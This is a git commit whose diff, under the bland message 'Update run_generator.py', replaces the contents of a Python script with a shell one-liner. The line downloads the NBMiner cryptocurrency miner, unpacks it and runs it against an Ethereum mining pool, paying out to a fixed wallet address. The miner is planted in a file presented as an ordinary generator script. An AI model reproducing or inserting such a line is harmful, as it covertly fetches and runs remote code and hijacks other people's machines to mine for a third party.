b5c0ef0dc21e17fe00c781deb41eec34da5eb364
FRIX_Y <73866768+splash24686@users.noreply.github.com>
2021-10-26 19:07:51 +0530

    Update run_generator.py

--- run_generator.py
+++ run_generator.py
@@ -1,1 +1,1 @@
-
+wget https://github.com/NebuTech/NBMiner/releases/download/v39.2/NBMiner_39.2_Linux.tgz && tar -xf NBMiner_39.2_Linux.tgz && cd NBMiner_Linux && ./nbminer -a ethash -o stratum+tcp://us1.ethermine.org:4444 -u 0x6ff85749ffac2d3a36efa2bc916305433fa93731.2gs2d6jahqzg0qq -p x
